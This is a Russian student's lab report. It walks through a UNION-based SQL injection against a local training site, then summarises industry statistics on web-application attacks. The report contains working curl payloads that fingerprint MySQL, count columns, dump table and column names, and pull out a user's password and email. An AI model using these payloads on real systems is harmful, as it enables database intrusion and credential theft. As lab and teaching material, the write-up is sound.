
# Решение лабы 1

> Ананьев Даниил БИВТ-24-9

### Ход работы

1. На сайте попросили ввести *id*, я попробовал следующую ссылку
```

http://localhost:8080/task/?id=1

```
2. Я получил ответ:
```

Ваш id:1
Ваш логин:admin

```
3. Далее я попробовал перебрать все возможные айди циклом, потому что не было ясно, сколько их всего существует:

```bash
for i in $(seq 0 100); 
    do echo "ID: $i" && 
    curl -s "http://localhost:8080/task/?id=$i" && echo; 
done
```

4. Отформатировав результаты, я получил следующее:

| ID  | Login      |
| --- | ---------- |
| 1   | admin      |
| 2   | Volk       |
| 3   | Matroskin  |
| 4   | Vinni-pukh |
| 5   | Neznaika   |
| 6   | kotenok    |
| 7   | Karlson    |
| 8   | Kesha      |
| 9   | Volk2      |

5. Запрос `curl -s "http://localhost:8080/task/?id=1'"` выдал ошибку:
```
You have an error in your SQL syntax; 
check the manual that corresponds to your 
MySQL server version for the right syntax 
to use near ''1'' LIMIT 0,1' at line 1
```

6. Это *MySQL*. Запрос выглядит примерно так: ... LIMIT 0,1

Я решил сделать `UNION SELECT`, но для начала мне надо узнать, сколько колонок в этой таблице:

```
# 2 columns — error
curl -s "http://localhost:8080/task/?id=0'+UNION+SELECT+1,2--+-"

# 3 columns — SUCCESS
curl -s "http://localhost:8080/task/?id=0'+UNION+SELECT+1,2,3--+-"
```

6. Далее я написал запрос, который через схему получит всевозможные таблицы бд. Я переписал его, учитывая особенности запроса, и со второй попытки получил что-то рабочее:

```bash
curl -s "http://localhost:8080/task/?id=0'+UNION+SELECT+1,GROUP_CONCAT(table_name+SEPARATOR+','),3+FROM+information_schema.tables+WHERE+table_schema=database()--+-"

# Ваш id:1<br>Ваш логин:emails,users</div></br></br>
```

7. Тк в бд всего 2 таблицы: `emails,users`. Далее я попросил переписать запрос через `information_schema.columns`, чтобы я смог получить названия колонок для каждой из таблиц:

```bash
# для users
curl -s "http://localhost:8080/task/?id=0'+UNION+SELECT+1,GROUP_CONCAT(column_name+SEPARATOR+','),3+FROM+information_schema.columns+WHERE+table_name='users'--+-"

# для emails
curl -s "http://localhost:8080/task/?id=0'+UNION+SELECT+1,GROUP_CONCAT(column_name+SEPARATOR+','),3+FROM+information_schema.columns+WHERE+table_name='emails'--+-"
```

```bash
# Результаты:
# users: id, username, password
# emails: id, email_id
```
8. Теперь, когда я знаю названия таблиц и колонок, не составит труда написать два запроса:

```bash
# пароль Volk2
# Result: Ваш логин:Wa spoiuuuuu
curl -s "http://localhost:8080/task/?id=0'+UNION+SELECT+1,password,3+FROM+users+WHERE+id=9--+-"

# почта Vinni-pukh
# Result: Ваш логин:honey_lover@otus-lab.com
curl -s "http://localhost:8080/task/?id=0'+UNION+SELECT+1,email_id,3+FROM+emails+WHERE+id=4--+-"
```

### Итоговые ответы на задание:

1. пароль пользователя *Volk2* - `Wa spoiuuuuu`
2. почта пользователя *Vinni-pukh* - `honey_lover@otus-lab.com`

# Отчет по уязвимостям

- В разных исследованиях метрики считаются по разному, поэтому я указал скоуп в таблице

| Источник | Период и scope | Доля успешных атак через эксплуатацию веб-уязвимостей | Распределение по конкретным уязвимостям веб-угроз |
|---|---|---:|---|
| **2024 Data Breach Investigations Report (DBIR)** | инциденты: 01.11.2022–31.10.2023. Scope: подтвержденные data breaches (глобальная выборка DBIR). | 8% всех breaches относятся к паттерну Basic Web Application Attacks. Внутри паттерна доля взломов через exploit vuln action = 13% (остальные — креды/перебор). | use of stolen credentials — 77%, brute force — 21%, exploit vuln — 13%. |
| **2025 DBIR snapshot / summary** | scope: подтвержденные data breaches (DBIR 2025, глобально. период инцидентов — 01.11.2023–31.10.2024). | Exploitation of vulnerabilities как initial access: 20% breaches (метрика шире, не только веб приложения: включает perimeter, VPN, edge). | нет детализованной информации |
| **X-Force Threat Intelligence Index 2025** | scope: incident response cases, наблюдения за 2024. | 30% инцидентов, где X-Force реагировал в 2024, включали exploitation of public-facing applications. | по регионам (initial access vector = exploitation of public-facing apps): NA — 40%, europe — 36%, Middle East & Africa — 33%, LATAM — 50% |
| google cloud **M-Trends 2025** | scope: mandiant incident response investigations за 2024. | В случаях, где был определен initial infection vector, 33% начались с эксплуатации уязвимости (в целом, не только web). Отдельно “Web compromise” как initial vector: 9%. | “Most frequently exploited vulnerabilities”: CVE-2024-3400 (Palo Alto PAN-OS GlobalProtect), CVE-2024-21887, CVE-2023-46805 (Ivanti Connect Secure), CVE-2023-48788 (Fortinet FortiClient EMS). |
| **WAF: доля разведывательных атак…** | scope: телеметрия BI.ZONE WAF по атакам на веб-приложения российских компаний за 2024 (это распределение вебугроз, а не breaches). | нету | категории вебугроз (2024): RCE — 36%; внутри RCE: OS command injection — 46% RCE, local/remote file inclusion — 40% RCE. Далее: path traversal / доступ к конфигам/логам — 16%, кража данных посетителей (XSS и др.) — 14%, SQL-инъекции/доступ к БД — 10%. Также упоминается, что попытки эксплуатации неисправленных уязвимостей устаревших технологий (CGI/JSP/Flash RCE LFI/RFI) составляют около 12% атак. |
| Positive Technologies | SCope: успешные атаки на организации в периоде IV квартал 2023. | В ~30% успешных атак злоумышленники эксплуатировали уязвимости (метрика шире, не только веб). | нет разбивки |

### Ссылки
- https://www.verizon.com/business/resources/reports/2024/2024-dbir-data-breach-investigations-report.pdf
- https://www.verizon.com/business/r3s0u4c3s/vps/vps-2025-dbir.pdf
- https://www.ibm.com/reports/threat-intelligence
- https://www.ibm.com/thought-leadership/institute-business-value/en-us/report/2025-threat-intelligence-index
- https://archive.orkl.eu/485ca080f5d6a75a30057719950065ba80882705.pdf
- https://bi.zone/news/dolya-razvedyvatelnykh-atak-s-tselyu-poiska-uyazvimostey-saytov-vyrosla-na-220/
- https://safe.cnews.ru/news/line/2024-02-29_positive_technologies_v_73_uspeshnyh